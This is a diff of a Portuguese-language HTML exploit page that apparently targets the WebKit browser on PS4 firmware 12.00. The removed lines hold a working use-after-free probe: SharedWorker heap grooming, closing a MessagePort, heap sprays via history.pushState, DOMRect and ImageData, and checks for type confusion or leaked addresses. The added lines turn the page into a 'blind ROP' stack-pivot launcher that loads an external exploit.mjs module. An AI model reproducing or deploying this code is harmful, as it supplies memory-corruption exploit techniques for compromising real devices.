@@ -2,165 +2,33 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 TYPE CONFUSION LEAK</title>
-    
+    <title>PS4 12.00 Modular ROP</title>
+    <style>
+        body { background-color: #0d1117; color: #c9d1d9; font-family: monospace; text-align: center; padding: 20px; }
+        #log { 
+            background-color: #000; border: 1px solid #30363d; 
+            width: 90%; height: 400px; margin: 20px auto; 
+            padding: 10px; text-align: left; overflow-y: auto; 
+            font-size: 13px; color: #58a6ff; 
+        }
+        button { padding: 15px 30px; font-size: 18px; background: #238636; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 10px; }
+        button:hover { background-color: #2ea043; }
+        .status { font-size: 14px; margin-bottom: 10px; color: #aaa; }
+    </style>
 </head>
 <body>
 
-    <h1>PS4 12.00 - LEAK HUNTER (DOM)</h1>
-    <h3>Estratégia: Type Confusion (Substituir Worker por Objetos DOM)</h3>
-    <div id="status">Selecione um tipo de Spray:</div>
-    
-    <div>
-        <button onclick="start_test('history')">1. History State (Dados)</button>
-        <button onclick="start_test('domrect')">2. DOMRect (Doubles)</button>
-        <button onclick="start_test('imagedata')">3. ImageData (Pixels)</button>
-    </div>
+    <h1>PS4 12.00 BLIND ROP</h1>
+    <h3>Estratégia: WebKit Stack Pivot (Rainbow Spray)</h3>
+    <p class="status">Abra via servidor HTTP (Python)</p>
 
-    <div id="log">Logs...</div>
+    <button id="btn_run">INICIAR ATAQUE</button>
+    <div id="log">Carregando módulos...</div>
 
-    <script>
-        function log(msg, type="") {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            d.scrollTop = d.scrollHeight;
-        }
-
-        // =================================================================
-        // 1. GERADORES DE SPRAY (Candidatos a Vizinhos)
-        // =================================================================
-        
-        // Candidato 1: History API (Clássico do WebKit)
-        // Aloca estruturas de dados serializadas no Heap.
-        function spray_history() {
-            // Criamos um objeto de tamanho aproximado 0x400
-            var state = { a: 1, b: 2, c: "A".repeat(0x400 - 64) };
-            for(var i=0; i<10000; i++) {
-                history.pushState(state, "");
-            }
-        }
-
-        // Candidato 2: DOMRect (Geometria)
-        // Aloca blocos de 4 doubles (x, y, w, h). Leve e rápido.
-        var rects = [];
-        function spray_domrect() {
-            for(var i=0; i<10000; i++) {
-                // Usamos valores mágicos: 1.1 (0x3FF199...) para identificar
-                var r = new DOMRect(1.1, 1.1, 1.1, 1.1);
-                rects.push(r);
-            }
-        }
-
-        // Candidato 3: ImageData
-        // Aloca buffers de pixel fora do IsoHeap de ArrayBuffer
-        var images = [];
-        function spray_imagedata() {
-            for(var i=0; i<2000; i++) {
-                // 16x16 pixels * 4 bytes = 1024 bytes (0x400)
-                try {
-                    var img = new ImageData(16, 16); 
-                    // Marca o início
-                    img.data[0] = 0x41; 
-                    images.push(img);
-                } catch(e) {}
-            }
-        }
-
-        // =================================================================
-        // 2. LÓGICA DE EXECUÇÃO
-        // =================================================================
-        var workers_stash = [];
-
-        async function start_test(mode) {
-            if(!window.SharedWorker) return log("Erro: Navegador incompatível.");
-            
-            log(`>>> INICIANDO TESTE: ${mode.toUpperCase()} <<<`, "highlight");
-            document.getElementById("status").innerText = "Rodando: " + mode;
-
-            // FASE 1: GROOMING (400)
-            workers_stash = [];
-            log("Grooming (400 workers)...");
-            for(let i=0; i<400; i++) {
-                try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
-            }
-
-            // FASE 2: TRIGGER (404)
-            var p_count = 0;
-            var it = setInterval(() => {
-                if(p_count >= 4) {
-                    clearInterval(it);
-                    trigger_leak(mode);
-                    return;
-                }
-                
-                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
-                w.port.start();
-                workers_stash.push(w);
-                p_count++;
-            }, 150);
-        }
-
-        function trigger_leak(mode) {
-            log("!!! DISPARANDO UAF !!!", "warn");
-            
-            // 1. Vítima
-            var v = workers_stash.pop();
-            var p = v.port; // Referência para leitura
-
-            // 2. FREE
-            v.port.close();
-            v = null;
-
-            // 3. SPRAY ESPECÍFICO
-            log(`Injetando ${mode}...`);
-            try {
-                if(mode === 'history') spray_history();
-                if(mode === 'domrect') spray_domrect();
-                if(mode === 'imagedata') spray_imagedata();
-            } catch(e) {
-                log("Erro no spray: " + e);
-            }
-
-            // 4. SONDA DE LEITURA
-            // Tentamos ler propriedades da porta morta.
-            // Se ela foi substituída por um HistoryState ou DOMRect,
-            // os valores internos vão mudar.
-            
-            log("Analisando objeto morto...");
-            
-            setTimeout(() => {
-                try {
-                    // Tenta forçar o JS a ler a estrutura interna
-                    var s = p.toString();
-                    log("ToString: " + s);
-
-                    // Se mudou de [object MessagePort], é SUCESSO TOTAL
-                    if(s.indexOf("MessagePort") === -1) {
-                        log("!!! TYPE CONFUSION CONFIRMADO !!!", "leak");
-                        log("O objeto agora é: " + s, "leak");
-                        alert("LEAK OBTIDO! Anote o resultado.");
-                        return;
-                    }
-
-                    // Teste Profundo: Tentar ler propriedades numéricas
-                    // Em alguns exploits, 'p.onmessage' vira um ponteiro
-                    var check = p.onmessage;
-                    if (check !== null) {
-                        log("Propriedade 'onmessage' alterada: " + check, "leak");
-                        // Se aparecer um número ou função estranha, é o leak.
-                    }
-                    
-                } catch(e) {
-                    log("Erro de acesso: " + e);
-                    // Se o erro tiver um endereço hexadecimal, também é um leak!
-                    if(e.toString().match(/0x[0-9a-fA-F]+/)) {
-                        log("LEAK NO ERRO: " + e, "leak");
-                    }
-                }
-                
-                log("Teste concluído. Se não houve leak, tente outro modo.");
-            }, 2000);
-        }
+    <script type="module">
+        import { init } from './exploit.mjs';
+        init();
     </script>
+
 </body>
 </html>
